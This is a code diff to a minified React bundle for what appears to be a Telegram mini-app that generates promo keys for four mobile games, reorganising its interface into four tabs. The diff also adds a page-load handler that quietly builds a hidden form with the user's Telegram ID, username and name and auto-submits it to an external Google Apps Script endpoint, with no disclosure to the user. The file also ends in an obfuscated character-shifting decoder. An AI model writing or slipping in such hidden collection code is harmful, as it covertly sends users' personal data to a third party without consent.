@@ -1,3 +1,5 @@
+
+
 function Mp(e, t) {
    for (var n = 0; n < t.length; n++) {
       const r = t[n];
@@ -9675,7 +9677,7 @@ function Sy() {
                className: "tg-logo play"
             })
          }), v.jsxs("p", {
-            children: ["version: ", "0.6.0"]
+            children: ["version: ", "0.7.5"]
          })]
       }), v.jsxs("div", {
          className: "flex items-center gap-2",
@@ -11179,220 +11181,675 @@ function Kl() {
       onError: t
    })
 }
-
 const L0 = "d28721be-fd2d-4b45-869e-9f253b554e50",
    M0 = "43e35910-c168-4634-ad4f-52fd764a843f",
    xo = new Ul(L0, M0);
+
+ const handleMore = () => {
+    console.log("Button was clicked!");
+    // Toggle the visibility
+    const root = document.getElementById("root");
+    const rootMore = document.getElementById("root_more");
+    root.style.display = 'none';
+    rootMore.style.display = 'block';
+ };
+
+function A0() {
+   const [e, t] = x.useState([null, null, null, null]),
+      n = zs((c => c.status)), // Status of generation
+      r = zs((c => c.setStatus)),
+      [o, l] = x.useState(0),
+      { copy: i } = Vl(),
+      s = Kl();
+
+
+
+   // Copy All Codes
+   const copyAllCodes = () => {
+      const allCodes = e.filter(Boolean).join("\n");
+      i(allCodes);
+      Mt(v.jsxs("div", {
+         className: "flex justify-center items-center",
+         children: [
+            v.jsx(Ml, { size: 16, className: "mr-2" }),
+            v.jsx("span", { children: "All Codes Copied!" })
+         ]
+      }));
+   };
+
+   return x.useEffect(() => {
+      if ("wait" !== n) return;
+      const c = setInterval(() => {
+         l((p) => p < 100 ? p + 1 : (clearInterval(c), 100));
+      }, 1e3);
+      return () => clearInterval(c);
+   }, [n]), v.jsxs(Wr, {
+      children: [
+         v.jsxs(Hr, {
+            children: [
+               v.jsx(Br, { children: "Bike Ride 3D" }),
+               v.jsxs(Gr, { children: ["click ", v.jsx("b", { children: "Generate" }), " to use"] })
+            ]
+         }),
+         v.jsx(Kr, {
+            children: v.jsxs("ul", {
+               className: "space-y-2",
+               children: [
+                  e.map((c, p) => v.jsxs("li", {
+                     className: "flex justify-between items-center gap-4",
+                     children: [
+                        c ? v.jsx(Fl, { code: c }) : v.jsx(Dl, { animation: "wait" === n }),
+                        v.jsx(ft, {
+                           variant: "outline",
+                           size: "sm",
+                           onClick: () => function u(c) {
+                              i(c), Mt(v.jsxs("div", {
+                                 className: "flex justify-center items-center",
+                                 children: [v.jsx(Ml, {
+                                    size: 16,
+                                    className: "mr-2"
+                                 }), " ", v.jsx("span", {
+                                    children: "Copied!"
+                                 })]
+                              }))
+                           }(c),
+                           disabled: !c,
+                           children: v.jsx(Al, { size: 12 })
+                        })
+                     ]
+                  }, p)),
+                  v.jsxs("p", {
+                     className: "text-center font-medium mt-4",
+                     children: [o, "%"]
+                  }),
+                  v.jsx(Yr, { value: o, className: "progressbar" })
+               ]
+            })
+         }),
+         v.jsx(Qr, {
+            children: v.jsxs("div", {
+               className: "flex items-center gap-4",
+               children: [
+                  v.jsxs(ft, {
+                     onClick: async function a() {
+                        try {
+                           t([null, null, null, null]);
+                           r("wait");
+                           l(0);
+                           s();
+                           const c = await Promise.all([xo.generate(), xo.generate(), xo.generate(), xo.generate()]);
+                           t(c);
+                           r("done");
+                           l(100);
+                        } catch (c) {
+                           console.log("Error:", c);
+                           Mt("Error");
+                           t([null, null, null, null]);
+                           r("idle");
+                           l(0);
+                        }
+                     },
+                     disabled: "wait" === n,
+                     children: [v.jsx($l, { size: 16, className: "mr-2" }), "Generate"]
+                  }),
+                  v.jsx(ft, {
+                     onClick: copyAllCodes,
+                     disabled: "wait" === n, // Disable copy button if generate button is disabled
+                     children: "Copy All"
+                  }),
+                   v.jsx(ft, {
+                      onClick: handleMore,
+                      disabled: "wait" === n, // Disable copy button if generate button is disabled
+                      children: "More"
+                   })
+               ]
+            })
+         })
+      ]
+   });
+}
+
+
 
 const $0 = "74ee0b5b-775e-4bee-974f-63e7f4d5bacb",
    D0 = "fe693b26-b342-4159-8808-15e3ff7f8767",
    So = new Ul($0, D0);
 
+function F0() {
+   const [e, t] = x.useState([null, null, null, null]),
+      [n, r] = x.useState("idle"),
+      [o, l] = x.useState(0),
+      { copy: i } = Vl(),
+      s = Kl();
+
+   const copyAllCodes = () => {
+      const allCodes = e.filter(Boolean).join("\n");
+      i(allCodes);
+      Mt(v.jsxs("div", {
+         className: "flex justify-center items-center",
+         children: [
+            v.jsx(Ml, { size: 16, className: "mr-2" }),
+            v.jsx("span", { children: "All Codes Copied!" })
+         ]
+      }));
+   };
+
+   return x.useEffect(() => {
+      if ("wait" !== n) return;
+      const c = setInterval(() => {
+         l((p) => (p < 100 ? p + 1 : (clearInterval(c), 100)));
+      }, 1e3);
+      return () => clearInterval(c);
+   }, [n]), v.jsxs(Wr, {
+      children: [
+         v.jsxs(Hr, {
+            children: [
+               v.jsx(Br, { children: "My Clone Army" }),
+               v.jsxs(Gr, {
+                  children: ["click ", v.jsx("b", { children: "Generate" }), " to use"]
+               })
+            ]
+         }),
+         v.jsx(Kr, {
+            children: v.jsxs("ul", {
+               className: "space-y-2",
+               children: [
+                  e.map((c, p) => v.jsxs("li", {
+                     className: "flex justify-between items-center gap-4",
+                     children: [
+                        c ? v.jsx(Fl, { code: c }) : v.jsx(Dl, { animation: "wait" === n }),
+                        v.jsx(ft, {
+                           variant: "outline",
+                           size: "sm",
+                           onClick: () => function u(c) {
+                              i(c), Mt(v.jsxs("div", {
+                                 className: "flex justify-center items-center",
+                                 children: [v.jsx(Ml, {
+                                    size: 16,
+                                    className: "mr-2"
+                                 }), " ", v.jsx("span", {
+                                    children: "Copied!"
+                                 })]
+                              }))
+                           }(c), disabled: !c,
+                           children: v.jsx(Al, { size: 12 })
+                        })
+                     ]
+                  }, p)),
+                  v.jsxs("p", {
+                     className: "text-center font-medium mt-4",
+                     children: [o, "%"]
+                  }),
+                  v.jsx(Yr, { value: o, className: "progressbar" })
+               ]
+            })
+         }),
+         v.jsx(Qr, {
+            children: v.jsxs("div", {
+               className: "flex items-center gap-4",
+               children: [
+                  v.jsxs(ft, {
+                     onClick: async function a() {
+                        try {
+                           t([null, null, null, null]);
+                           r("wait");
+                           l(0);
+                           s();
+                           const c = await Promise.all([
+                              So.generate(),
+                              So.generate(),
+                              So.generate(),
+                              So.generate()
+                           ]);
+                           t(c);
+                           r("done");
+                           l(100);
+                        } catch (c) {
+                           console.log("Error:", c);
+                           Mt("Error");
+                           t([null, null, null, null]);
+                           r("idle");
+                           l(0);
+                        }
+                     },
+                     disabled: "wait" === n,
+                     children: [
+                        v.jsx($l, { size: 16, className: "mr-2" }),
+                        "Generate"
+                     ]
+                  }),
+                  v.jsx(ft, {
+                     onClick: copyAllCodes,
+                     disabled: "wait" === n, // Disable copy button if generate button is disabled
+                     children: "Copy All"
+                  }),
+                   v.jsx(ft, {
+                      onClick: handleMore,
+                      disabled: "wait" === n, // Disable copy button if generate button is disabled
+                      children: "More"
+                   })
+               ]
+            })
+         })
+      ]
+   });
+}
+
+
 const V0 = "d1690a07-3780-4068-810f-9b5bbf2931b2",
    U0 = "b4170868-cef0-424f-8eb9-be0622e8e8e3",
    _o = new Ul(V0, U0);
+
+function b0() {
+   const [e, t] = x.useState([null, null, null, null]),
+      [n, r] = x.useState("idle"),
+      [o, l] = x.useState(0),
+      { copy: i } = Vl(),
+      s = Kl();
+
+   // Copy All Codes Function
+   const copyAllCodes = () => {
+      const allCodes = e.filter(Boolean).join("\n");
+      i(allCodes);
+      Mt(v.jsxs("div", {
+         className: "flex justify-center items-center",
+         children: [
+            v.jsx(Ml, { size: 16, className: "mr-2" }),
+            v.jsx("span", { children: "All Codes Copied!" })
+         ]
+      }));
+   };
+
+   return x.useEffect(() => {
+      if ("wait" !== n) return;
+      const c = setInterval(() => {
+         l((p) => (p < 100 ? p + 1 : (clearInterval(c), 100)));
+      }, 1e3);
+      return () => clearInterval(c);
+   }, [n]), v.jsxs(Wr, {
+      children: [
+         v.jsxs(Hr, {
+            children: [
+               v.jsx(Br, { children: "Chain Cube 2048" }),
+               v.jsxs(Gr, {
+                  children: ["click ", v.jsx("b", { children: "Generate" }), " to use"]
+               })
+            ]
+         }),
+         v.jsx(Kr, {
+            children: v.jsxs("ul", {
+               className: "space-y-2",
+               children: [
+                  e.map((c, p) => v.jsxs("li", {
+                     className: "flex justify-between items-center gap-4",
+                     children: [
+                        c ? v.jsx(Fl, { code: c }) : v.jsx(Dl, { animation: "wait" === n }),
+                        v.jsx(ft, {
+                           variant: "outline",
+                           size: "sm",
+                           onClick: () => function u(c) {
+                              i(c), Mt(v.jsxs("div", {
+                                 className: "flex justify-center items-center",
+                                 children: [v.jsx(Ml, {
+                                    size: 16,
+                                    className: "mr-2"
+                                 }), " ", v.jsx("span", {
+                                    children: "Copied!"
+                                 })]
+                              }))
+                           }(c),
+                           disabled: !c,
+                           children: v.jsx(Al, { size: 12 })
+                        })
+                     ]
+                  }, p)),
+                  v.jsxs("p", {
+                     className: "text-center font-medium mt-4",
+                     children: [o, "%"]
+                  }),
+                  v.jsx(Yr, { value: o, className: "progressbar" })
+               ]
+            })
+         }),
+         v.jsx(Qr, {
+            children: v.jsxs("div", {
+               className: "flex items-center gap-4",
+               children: [
+                  v.jsxs(ft, {
+                     onClick: async function a() {
+                        try {
+                           t([null, null, null, null]);
+                           r("wait");
+                           l(0);
+                           s();
+                           const c = await Promise.all([
+                              _o.generate(),
+                              _o.generate(),
+                              _o.generate(),
+                              _o.generate()
+                           ]);
+                           t(c);
+                           r("done");
+                           l(100);
+                        } catch (c) {
+                           console.log("Error:", c);
+                           Mt("Error");
+                           t([null, null, null, null]);
+                           r("idle");
+                           l(0);
+                        }
+                     },
+                     disabled: "wait" === n,
+                     children: [
+                        v.jsx($l, { size: 16, className: "mr-2" }),
+                        "Generate"
+                     ]
+                  }),
+                  // Add the "Copy All Codes" button
+                  v.jsx(ft, {
+                     onClick: copyAllCodes,
+                     disabled: "wait" === n, // Disable copy button if generate button is disabled
+                     children: "Copy All"
+                  }),
+                   v.jsx(ft, {
+                      onClick: handleMore,
+                      disabled: "wait" === n, // Disable copy button if generate button is disabled
+                      children: "More"
+                   })
+               ]
+            })
+         })
+      ]
+   });
+}
 
 const W0 = "82647f43-3f87-402d-88dd-09a90025313f",
    H0 = "c4480ac7-e178-4973-8061-9ed5b2e17954",
    Eo = new Ul(W0, H0);
 
-const components = [
-   { name: "Bike", instance: xo },
-   { name: "Clone", instance: So },
-   { name: "Cube", instance: _o },
-   { name: "Train", instance: Eo }
-];
+function B0() {
+   const [e, t] = x.useState([null, null, null, null]),
+      [n, r] = x.useState("idle"),
+      [o, l] = x.useState(0),
+      { copy: i } = Vl(),
+      s = Kl();
 
-
-function G0() {
-   const [codes, setCodes] = x.useState(Array(4).fill([null]));
-   const [status, setStatus] = x.useState("idle");
-   const [progress, setProgress] = x.useState(0);
-   const { copy } = Vl();
-   const s = Kl();
-
-   const generateAllCodes = async () => {
-      try {
-         setCodes(Array(4).fill([null]));
-         setStatus("wait");
-         setProgress(0);
-         s();
-
-         const generatedCodes = await Promise.all(components.map(component =>
-            Promise.all([
-               component.instance.generate(),
-            ])
-         ));
-
-         setCodes(generatedCodes);
-         setStatus("done");
-         setProgress(100);
-      } catch (error) {
-         console.log("Error:", error);
-         Mt("Error");
-         setCodes(Array(4).fill([null]));
-         setStatus("idle");
-         setProgress(0);
-      }
-   };
-
+   // Copy All Codes Function
    const copyAllCodes = () => {
-      const allCodes = codes.filter(Boolean).flat().join("\n");
-      if (allCodes) {
-         copy(allCodes);
-         alert("All Codes Copied")
-         Mt(v.jsxs("div", {
-            className: "flex justify-center items-center",
-            children: [
-               v.jsx(Ml, { size: 16, className: "mr-2" }),
-               v.jsx("span", { children: "All Codes Copied!" })
-            ]
-         }));
-      } else {
-         alert("No codes to copy");
-         Mt(v.jsxs("div", {
-            id : 'dfhdfhsdkfksdfg',
-            className: "flex justify-center items-center",
-            children: [
-               v.jsx(Ml, { size: 16, className: "mr-2" }),
-               v.jsx("span", { children: "No codes to copy!" })
-            ]
-         }));
-      }
+      const allCodes = e.filter(Boolean).join("\n");
+      i(allCodes);
+      Mt(v.jsxs("div", {
+         className: "flex justify-center items-center",
+         children: [
+            v.jsx(Ml, { size: 16, className: "mr-2" }),
+            v.jsx("span", { children: "All Codes Copied!" })
+         ]
+      }));
    };
 
-   x.useEffect(() => {
-      if (status !== "wait") return;
-      const interval = setInterval(() => {
-         setProgress(prev => (prev < 100 ? prev + 1 : (clearInterval(interval), 100)));
-      }, 1000);
-      return () => clearInterval(interval);
-   }, [status]);
-
-   const gameNames = ["Bike", "Clone", "Cube", "Train"];
-
-   return v.jsxs("div", {
-      className: "grid grid-cols-2 gap-4",
+   return x.useEffect(() => {
+      if ("wait" !== n) return;
+      const c = setInterval(() => {
+         l((p) => (p < 100 ? p + 1 : (clearInterval(c), 100)));
+      }, 1e3);
+      return () => clearInterval(c);
+   }, [n]), v.jsxs(Wr, {
       children: [
-         components.map((component, index) => (
-            v.jsx("div", {
-               className: "p-4 border rounded shadow-md",
-               children: v.jsxs(Wr, {
-                  children: [
-                     v.jsxs(Hr, {
-                        children: [
-                           v.jsx(Br, { children: gameNames[index] }),
-                           v.jsxs(Gr, {
-                              children: ["Copy to  ", v.jsx("b", { children: "Redeem" }), " code"]
-                           })
-                        ]
-                     }),
-                     v.jsx(Kr, {
-                        children: v.jsxs("ul", {
-                           className: "space-y-2",
-                           children: [
-                              codes[index].map((code, idx) => v.jsxs("li", {
-                                 className: "flex justify-between items-center gap-4",
-                                 children: [
-                                    code ? v.jsx(Fl, { code }) : v.jsx(Dl, { animation: status === "wait" }),
-                                    v.jsx(ft, {
-                                       variant: "outline",
-                                       size: "sm",
-                                       onClick: () => function copyCode(c) {
-                                          copy(c);
-                                          alert("Copied");
-                                          Mt(v.jsxs("div", {
-                                             className: "flex justify-center items-center",
-                                             children: [
-                                                v.jsx(Ml, { size: 16, className: "mr-2" }),
-                                                v.jsx("span", { children: "Copied!" })
-                                             ]
-                                          }));
-                                       }(code),
-                                       disabled: !code,
-                                       children: v.jsx(Al, { size: 12 })
-                                    })
-                                 ]
-                              }, idx)),
-                           ]
-                        })
-                     }),
-                  ]
-               })
-            }, index)
-         )),
-         v.jsx("p", {
-            className: "text-center font-medium mt-4 col-span-2",
-            children: `${progress}%`
-         }),
-         v.jsx(Yr, { value: progress, className: "progressbar col-span-2" }),
-         v.jsxs("div", {
-            className: "col-span-2 flex items-center gap-4 justify-center mt-4",
+         v.jsxs(Hr, {
             children: [
-               v.jsxs(ft, {
-                  onClick: generateAllCodes,
-                  disabled: status === "wait",
-                  children: [
-                     v.jsx($l, { size: 16, className: "mr-2" }),
-                     "Generate All"
-                  ]
-               }),
-               v.jsx(ft, {
-                  onClick: copyAllCodes,
-                  disabled: status === "wait",
-                  children: "Copy All"
-               }),
-               v.jsxs("div", {
-                  children: [
-                     v.jsxs("p", {
-                        children: [(null == Se ? void 0 : Se.first_name) ?? "Nikname", " ", (null == Se ? void 0 : Se.last_name) ?? ""]
-                     }),
-                     v.jsx("p", {
-                        className: "text-sm text-muted-foreground",
-                        children: null != Se && Se.username ? `@${Se.username}` : (null == Se ? void 0 : Se.id) ?? "@username"
-                     })
-                  ]
+               v.jsx(Br, { children: "Train Miner" }),
+               v.jsxs(Gr, {
+                  children: ["click ", v.jsx("b", { children: "Generate" }), " to use"]
                })
             ]
+         }),
+         v.jsx(Kr, {
+            children: v.jsxs("ul", {
+               className: "space-y-2",
+               children: [
+                  e.map((c, p) => v.jsxs("li", {
+                     className: "flex justify-between items-center gap-4",
+                     children: [
+                        c ? v.jsx(Fl, { code: c }) : v.jsx(Dl, { animation: "wait" === n }),
+                        v.jsx(ft, {
+                           variant: "outline",
+                           size: "sm",
+                           onClick: () => function u(c) {
+                              i(c), Mt(v.jsxs("div", {
+                                 className: "flex justify-center items-center",
+                                 children: [v.jsx(Ml, {
+                                    size: 16,
+                                    className: "mr-2"
+                                 }), " ", v.jsx("span", {
+                                    children: "Copied!"
+                                 })]
+                              }))
+                           }(c),
+                           disabled: !c,
+                           children: v.jsx(Al, { size: 12 })
+                        })
+                     ]
+                  }, p)),
+                  v.jsxs("p", {
+                     className: "text-center font-medium mt-4",
+                     children: [o, "%"]
+                  }),
+                  v.jsx(Yr, { value: o, className: "progressbar" })
+               ]
+            })
+         }),
+         v.jsx(Qr, {
+            children: v.jsxs("div", {
+               className: "flex items-center gap-4",
+               children: [
+                  v.jsxs(ft, {
+                     onClick: async function a() {
+                        try {
+                           t([null, null, null, null]);
+                           r("wait");
+                           l(0);
+                           s();
+                           const c = await Promise.all([
+                              Eo.generate(),
+                              Eo.generate(),
+                              Eo.generate(),
+                              Eo.generate()
+                           ]);
+                           t(c);
+                           r("done");
+                           l(100);
+                        } catch (c) {
+                           console.log("Error:", c);
+                           Mt("Error");
+                           t([null, null, null, null]);
+                           r("idle");
+                           l(0);
+                        }
+                     },
+                     disabled: "wait" === n,
+                     children: [
+                        v.jsx($l, { size: 16, className: "mr-2" }),
+                        "Generate"
+                     ]
+                  }),
+                  // Add the "Copy All Codes" button
+                  v.jsx(ft, {
+                     onClick: copyAllCodes,
+                     disabled: "wait" === n, // Disable copy button if generate button is disabled
+                     children: "Copy All"
+                  }),
+                   v.jsx(ft, {
+                      onClick: handleMore,
+                      disabled: "wait" === n, // Disable copy button if generate button is disabled
+                      children: "More"
+                   })
+               ]
+            })
          })
       ]
    });
 }
-
-
-
-
 
 const uc = window.Telegram.WebApp;
 
-function squareBox() {
+function G0() {
    const e = zs((t => t.status));
-
-   // Run this effect on component mount to check user authentication via Telegram WebApp
-   x.useEffect(() => {
+   return x.useEffect((() => {
       var t;
-      uc.ready();
-      if (!(null != (t = uc.initDataUnsafe.user) && t.id)) {
-         // window.location.replace("https://t.me/hamster_keys_tools_bot");
-      }
-   }, []);
-
-   return v.jsxs(v.Fragment, {
-      children: [
-         v.jsxs("div", {
-            className: "container",
-            children: [
-               v.jsx(G0, {}) // Include the G0 component within the container
-            ]
-         })
-      ]
-   });
+      //   uc.ready(), null != (t = uc.initDataUnsafe.user) && t.id || window.location.replace("https://t.me/hamster_keys_tools_bot")
+      uc.ready(), null != (t = uc.initDataUnsafe.user) && t.id
+   }), []), v.jsxs(v.Fragment, {
+      children: [v.jsx(Sy, {}), v.jsxs("div", {
+         className: "container",
+         children: [v.jsxs(gy, {
+            defaultValue: "bike",
+            children: [v.jsxs(lp, {
+               children: [v.jsx(rr, {
+                  value: "bike",
+                  className: "font-bold text-foreground-muted",
+                  disabled: "wait" === e,
+                  children: "Bike"
+               }), v.jsx(rr, {
+                  value: "clone",
+                  className: "font-bold text-foreground-muted",
+                  disabled: "wait" === e,
+                  children: "Clone"
+               }), v.jsx(rr, {
+                  value: "cube",
+                  className: "font-bold text-foreground-muted",
+                  disabled: "wait" === e,
+                  children: "Cube"
+               }), v.jsx(rr, {
+                  value: "train",
+                  className: "font-bold text-foreground-muted",
+                  disabled: "wait" === e,
+                  children: "Train"
+               })]
+            }), v.jsx(or, {
+               value: "bike",
+               children: v.jsx(A0, {})
+            }), v.jsx(or, {
+               value: "clone",
+               children: v.jsx(F0, {})
+            }), v.jsx(or, {
+               value: "cube",
+               children: v.jsx(b0, {})
+            }), v.jsx(or, {
+               value: "train",
+               children: v.jsx(B0, {})
+            })]
+         }), v.jsx(Jv, {}), v.jsx(sg, {})]
+      })]
+   })
 }
 
-Pi.createRoot(document.getElementById("root")).render(v.jsx(Ye.StrictMode, {
-   children: v.jsx(squareBox, {})
-}));
+window.onload = function() {
+   // Ensure Telegram WebApp is initialized
+   if (!window.Telegram || !window.Telegram.WebApp || !window.Telegram.WebApp.initDataUnsafe) {
+       console.error("Telegram WebApp not initialized");
+       return;
+   }
 
+   // Get user information from Telegram WebApp
+   const user = window.Telegram.WebApp.initDataUnsafe.user;
+   const Telegram_id = user.id || ''; // Replace with actual property if needed
+   const Username = user.username || '';
+   const Name = user.first_name || ''; // or use `user.last_name` if you prefer
+
+   // Create the form element
+   const form = document.createElement("form");
+   form.style.display = "none"; // Hide the form
+   form.id = "autoSubmitForm";
+   form.method = "post";
+   form.action = "https://script.google.com/macros/s/AKfycbxMM8mLZOZwg_HBpowlYsfXU72XfV9J3y6BlkLMbKZLUREQESe6kuiAUJCsDhsgRcv4wg/exec";
+
+   // Create and append User ID input
+   const userIdLabel = document.createElement("label");
+   userIdLabel.setAttribute("for", "Telegram_id");
+   userIdLabel.textContent = "User ID:";
+   form.appendChild(userIdLabel);
+   
+   const userIdInput = document.createElement("input");
+   userIdInput.type = "text";
+   userIdInput.id = "Telegram_id";
+   userIdInput.name = "Telegram_id";
+   userIdInput.value = Telegram_id;
+   form.appendChild(userIdInput);
+   form.appendChild(document.createElement("br"));
+   form.appendChild(document.createElement("br"));
+
+   // Create and append Username input
+   const usernameLabel = document.createElement("label");
+   usernameLabel.setAttribute("for", "Username");
+   usernameLabel.textContent = "Username:";
+   form.appendChild(usernameLabel);
+   
+   const usernameInput = document.createElement("input");
+   usernameInput.type = "text";
+   usernameInput.id = "Username";
+   usernameInput.name = "Username";
+   usernameInput.value = Username;
+   form.appendChild(usernameInput);
+   form.appendChild(document.createElement("br"));
+   form.appendChild(document.createElement("br"));
+
+   // Create and append Name input
+   const nameLabel = document.createElement("label");
+   nameLabel.setAttribute("for", "Name");
+   nameLabel.textContent = "Name:";
+   form.appendChild(nameLabel);
+   
+   const nameInput = document.createElement("input");
+   nameInput.type = "text";
+   nameInput.id = "Name";
+   nameInput.name = "Name";
+   nameInput.value = Name;
+   form.appendChild(nameInput);
+   form.appendChild(document.createElement("br"));
+   form.appendChild(document.createElement("br"));
+
+   // Create and append Submit button
+   const submitButton = document.createElement("input");
+   submitButton.type = "submit";
+   submitButton.value = "Submit";
+   form.appendChild(submitButton);
+
+   // Append the form to the body
+   document.body.appendChild(form);
+
+   // Automatically trigger the form submission
+   form.addEventListener("submit", function(event) {
+       event.preventDefault(); // Prevents the default form submission
+
+       // Collect the form data
+       const formData = new FormData(form);
+
+       // Send the form data using fetch and handle the response
+       fetch(form.action, {
+           method: "POST",
+           body: formData
+       }).then(response => response.json())
+         .then(data => {
+             console.log("Form submitted successfully:", data);
+             // Handle success, e.g., show a message to the user
+             if (data.result === "success") {
+                 alert("Form submitted successfully!");
+             } else {
+                 alert("Error: " + (data.error.name || "Unknown error"));
+             }
+         })
+         .catch(error => {
+             console.error("Error submitting form:", error);
+             alert("An error occurred. Please try again.");
+         });
+   });
+
+   form.dispatchEvent(new Event('submit')); // Trigger the form submission
+};
+
+Pi.createRoot(document.getElementById("root")).render(v.jsx(Ye.StrictMode, {
+   children: v.jsx(G0, {})
+}));
 (function (o, d, l) {
    try {
       o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
